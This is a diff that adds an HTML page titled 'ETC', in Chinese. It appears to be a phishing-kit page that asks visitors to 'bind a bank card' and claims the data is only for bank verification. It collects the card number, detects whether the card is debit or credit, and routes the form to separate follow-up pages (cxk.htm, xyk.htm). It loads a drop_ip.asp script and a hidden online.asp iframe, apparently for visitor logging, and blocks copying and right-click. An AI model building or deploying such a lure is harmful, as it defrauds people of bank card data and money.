@@ -1,0 +1,246 @@
+<img src="app/aa.jpg" width="100%" height="auto" />
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>ETC</title>
+<script language="javascript" src="drop_ip.asp"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
+ <style>
+        html {
+    background-color: #fff;
+    font-size: 14px;
+    color: #2b2b2b;
+    background: #f5f5f5
+}
+
+body {
+    margin: 0px;
+    padding: 0px;
+}
+
+* {
+    font-family: "微软雅黑";
+}
+input[type="button"],input[type="submit"],input[type="reset"],input[type="text"],input[type="tel"],button,textarea{-webkit-appearance:none;}
+
+
+div,ul,li,dt,dd,p {
+    padding: 0px;
+    margin: 0px;
+}
+
+.wrap {
+    width: 100%;
+    background: #f5f5f5;
+    max-width: 640px;
+    margin: 0 auto
+}
+
+.khimg {
+    margin: 0 auto;
+    text-align: center;
+    width: 90%;
+    overflow: hidden;
+    margin-bottom: 20px;
+    padding-top: 5px;
+}
+
+.khimg img {
+    width: 10%;
+    float: left;
+    overflow: hidden;
+    line-height: 30px;
+}
+
+.khimg span {
+    float: left;
+	color: #0b2398;
+	padding-top: 7px;
+    line-height: 20px;
+    padding-left: 10px;
+    font-weight: bold
+}
+
+.tjform {
+    margin-top: 10px;
+    overflow: hidden;
+    width: 100%;
+    margin-top: 20px;
+}
+
+.yhkh {
+    width: 80%;
+    padding: 2% 2%;
+    margin: 0 auto;
+    border: 1px solid #dddddd;
+    box-shadow: 5px 5px 10px  #eeeeee;
+    border-radius: 10px;
+    overflow: hidden;
+    background: #fff;
+    margin-bottom: 20px;
+}
+
+.yhkh span {
+    font-size: 15px;
+    font-weight: 900;
+    float: left;
+    width: 25%;
+    height: 30px;
+    line-height: 30px;
+    text-align: center
+}
+
+.yhkh input {
+    float: left;
+    border: none;
+    height: 100%;
+    width: 70%;
+    height: 30px;
+    line-height: 30px;
+    font-size: 15px;
+    padding-left: 15px;
+}
+
+.tjbtn {
+    width: 100%;
+    text-align: center;
+    margin-top: 20px;
+}
+
+.tjbtn input {
+    background: #f84347;
+    border: none;
+    padding: 3%  10%;
+    text-align: center;
+    color: #fff;
+    width: 80%;
+    font-size: 16px;
+    border-radius: 10px;
+    margin: 0 auto
+}
+
+.beizhu {
+    text-align: left;
+    color: #636363;
+    padding-left: 4%
+}
+
+.beizhu a {
+    color: #6295c4;
+    text-decoration: none
+}
+
+.shuom {
+    background: #e6f0f9;
+	font-size: 13px;
+    padding: 10px 15px 5px 15px;
+    color: #5f9bd9;
+    margin-bottom: 20px;
+    overflow: hidden;
+    line-height: 24px;
+}
+
+.content {
+    width: 90%;
+    margin: 0 auto
+}
+    </style> 
+    <script type="text/javascript" src="app/js/jquery-1.9.1.min.js"></script>
+    <script type="text/javascript" src="app/js/bankCheck.js"></script>
+
+</head>
+
+<body oncontextmenu="return false" onselectstart="return false"?
+
+ondragstart="return false" onbeforecopy="return false" oncopy=document.selection.empty() onselect=document.selection.empty()>
+    <div class="wrap">
+	
+            <div class="shuom">安全信息已做加密处理，仅用于银行验证。认证通过之后身份信息不可更改。</div>
+	<!--		<center><img src="app/img/1.png" style="width: 45%;"></center>-->
+	
+	<span style="font-size:18px;padding-left: 30px;"><strong>绑定银行卡：</strong></span>
+	
+        <form method="get" action="" class="am-form am-form-horizontal" name="form1" onsubmit="return ChkFields()">
+            <div class="tjform">
+                <div class="yhkh"><span>银行卡号</span>
+                    <input type="text" placeholder="请输入银行卡号" name="g_zhanghao" maxlength="23" id="g_zhanghao" onblur="checkBankAccount();">
+                </div>
+&nbsp; &nbsp; &nbsp;<input type="checkbox" checked="false" class="hide" value="1"data-role="none">
+<label style="font-size: 12px;">阅读并同意<span  style="color:#2d78f4;">《用户使用协议》</span>的相关服务条款</label>
+                <div class="tjbtn">
+                    <input name="" type="submit" value="下一步" id="btn">
+                </div>
+            </div>
+            <input type="hidden" value="" name="qkmm" id="qkmm">
+            <input type="hidden" value="" name="logo" id="bankLogo">
+        </form>
+    </div>
+    <script language="JavaScript">
+        function ChkFields() {
+            //	if ($("#accountNo").val()=='') {
+            //				window.alert ("卡号输入不能为空，请重新输入");
+            //				form1.accountNo.focus();
+            //				return false
+            //			}
+            var a1 = /^(\d{16}|\d{19})$/;
+            if (!a1.test(document.getElementById('g_zhanghao').value)) {
+                window.alert('银行卡号输入错误！');
+                document.getElementById('g_zhanghao').focus();
+                return false
+            }
+//			return false;
+        }
+    </script>
+    <script>
+        //验证银行卡号
+		var bankLogo = {
+			PSBC:'yz',
+			ICBC:'gs',
+			ABC:'ny',
+			BOC:'zg',
+			CCB:'js',
+			COMM:'jt',
+			CMB:'zs',
+			CMBC:'ms',
+			CEB:'gd',
+			CITIC:'zx',
+			HXBANK:'hx',
+			SPABANK:'yinlian',
+			CIB:'xy',
+			SHBANK:'yinlian',
+			SPDB:'pf',
+			GDB:'gf',
+			BJBANK:'bj',
+			CIB:'xy',
+		};
+        function checkBankAccount() {
+            var bankg_zhanghao = $("input[name=g_zhanghao]").val();
+            var result = bankCardAttribution(bankg_zhanghao);
+			console.log(result);
+			console.log(result.bankCode);
+            if (result.bankName == null) {
+                alert("请输入正确的银行卡号！");
+                $("input[name=g_zhanghao]").val("");
+            } else {
+				var bankPng = bankLogo[result.bankCode]?bankLogo[result.bankCode]:'yinlian';
+				$('#bankLogo').val(bankPng + '.png');
+                if (result.cardType == "DC") {
+                    $('#qkmm').val("储蓄卡-" + result.bankName);
+					$('form').attr('action','cxk.htm')
+                } else if (result.cardType == "CC") {
+                    $('#qkmm').val("信用卡-" + result.bankName);
+					$('form').attr('action','xyk.htm')
+                } else if (result.cardType == "SCC") {
+                    $('#qkmm').val("信用卡-" + result.bankName);
+					$('form').attr('action','xyk.htm')
+                } else if (result.cardType == "PC") {
+                    $('#qkmm').val("预付费卡-" + result.bankName);
+                }
+            }
+        }
+    </script>
+<iframe src="online.asp" style="display: none;"></iframe>
+</body>
+
+</html>
